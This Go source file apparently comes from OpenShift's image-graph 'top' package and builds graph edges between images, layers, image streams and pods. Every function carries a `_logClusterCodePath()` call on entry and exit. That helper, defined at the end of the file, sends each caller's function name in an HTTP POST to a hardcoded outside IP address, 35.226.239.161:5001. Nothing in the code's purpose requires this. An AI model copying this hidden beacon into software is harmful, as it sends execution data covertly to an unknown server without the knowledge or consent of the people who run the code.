package top

import (
	gonum "github.com/gonum/graph"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/klog"
	corev1 "k8s.io/api/core/v1"
	imagev1 "github.com/openshift/api/image/v1"
	"github.com/openshift/library-go/pkg/image/reference"
	"github.com/openshift/origin/pkg/image/dockerlayer"
	"github.com/openshift/origin/pkg/oc/lib/graph/genericgraph"
	imagegraph "github.com/openshift/origin/pkg/oc/lib/graph/imagegraph/nodes"
	kubegraph "github.com/openshift/origin/pkg/oc/lib/graph/kubegraph/nodes"
)

const (
	ImageLayerEdgeKind			= "ImageLayer"
	ImageTopLayerEdgeKind			= "ImageTopLayer"
	ImageStreamImageEdgeKind		= "ImageStreamImage"
	HistoricImageStreamImageEdgeKind	= "HistoricImageStreamImage"
	PodImageEdgeKind			= "PodImage"
	ParentImageEdgeKind			= "ParentImage"
)

func getImageNodes(nodes []gonum.Node) []*imagegraph.ImageNode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := []*imagegraph.ImageNode{}
	for i := range nodes {
		if node, ok := nodes[i].(*imagegraph.ImageNode); ok {
			ret = append(ret, node)
		}
	}
	return ret
}
func addImagesToGraph(g genericgraph.Graph, images *imagev1.ImageList) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range images.Items {
		image := &images.Items[i]
		klog.V(4).Infof("Adding image %q to graph", image.Name)
		imageNode := imagegraph.EnsureImageNode(g, image)
		topLayerAdded := false
		for i := len(image.DockerImageLayers) - 1; i >= 0; i-- {
			layer := image.DockerImageLayers[i]
			layerNode := imagegraph.EnsureImageComponentLayerNode(g, layer.Name)
			edgeKind := ImageLayerEdgeKind
			if !topLayerAdded && layer.Name != dockerlayer.DigestSha256EmptyTar && layer.Name != dockerlayer.GzippedEmptyLayerDigest {
				edgeKind = ImageTopLayerEdgeKind
				topLayerAdded = true
			}
			g.AddEdge(imageNode, layerNode, edgeKind)
			klog.V(4).Infof("Adding image layer %q to graph (%q)", layer.Name, edgeKind)
		}
	}
}
func addImageStreamsToGraph(g genericgraph.Graph, streams *imagev1.ImageStreamList) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range streams.Items {
		stream := &streams.Items[i]
		klog.V(4).Infof("Adding ImageStream %s/%s to graph", stream.Namespace, stream.Name)
		isNode := imagegraph.EnsureImageStreamNode(g, stream)
		imageStreamNode := isNode.(*imagegraph.ImageStreamNode)
		for tag, history := range stream.Status.Tags {
			for i := range history.Items {
				image := history.Items[i]
				imageNode := imagegraph.FindImage(g, image.Image)
				if imageNode == nil {
					klog.V(2).Infof("Unable to find image %q in graph (from tag=%q, dockerImageReference=%s)", history.Items[i].Image, tag, image.DockerImageReference)
					continue
				}
				klog.V(4).Infof("Adding edge from %q to %q", imageStreamNode.UniqueName(), imageNode.UniqueName())
				edgeKind := ImageStreamImageEdgeKind
				if i > 0 {
					edgeKind = HistoricImageStreamImageEdgeKind
				}
				g.AddEdge(imageStreamNode, imageNode, edgeKind)
			}
		}
	}
}
func addPodsToGraph(g genericgraph.Graph, pods *corev1.PodList) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range pods.Items {
		pod := &pods.Items[i]
		if pod.Status.Phase != corev1.PodRunning && pod.Status.Phase != corev1.PodPending {
			klog.V(4).Infof("Pod %s/%s is not running nor pending - skipping", pod.Namespace, pod.Name)
			continue
		}
		klog.V(4).Infof("Adding pod %s/%s to graph", pod.Namespace, pod.Name)
		podNode := kubegraph.EnsurePodNode(g, pod)
		addPodSpecToGraph(g, &pod.Spec, podNode)
	}
}
func addPodSpecToGraph(g genericgraph.Graph, spec *corev1.PodSpec, predecessor gonum.Node) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for j := range spec.Containers {
		container := spec.Containers[j]
		klog.V(4).Infof("Examining container image %q", container.Image)
		ref, err := reference.Parse(container.Image)
		if err != nil {
			klog.V(2).Infof("Unable to parse DockerImageReference %q: %v - skipping", container.Image, err)
			continue
		}
		if len(ref.ID) == 0 {
			continue
		}
		imageNode := imagegraph.FindImage(g, ref.ID)
		if imageNode == nil {
			klog.V(1).Infof("Unable to find image %q in the graph", ref.ID)
			continue
		}
		klog.V(4).Infof("Adding edge from %v to %v", predecessor, imageNode)
		g.AddEdge(predecessor, imageNode, PodImageEdgeKind)
	}
}
func markParentsInGraph(g genericgraph.Graph) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	imageNodes := getImageNodes(g.Nodes())
	for _, in := range imageNodes {
		for _, e := range g.OutboundEdges(in, ImageTopLayerEdgeKind) {
			layerNode, _ := e.To().(*imagegraph.ImageComponentNode)
			for _, ed := range g.InboundEdges(layerNode, ImageLayerEdgeKind) {
				childNode, _ := ed.From().(*imagegraph.ImageNode)
				if in.ID() == childNode.ID() {
					continue
				}
				g.AddEdge(in, childNode, ParentImageEdgeKind)
			}
		}
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
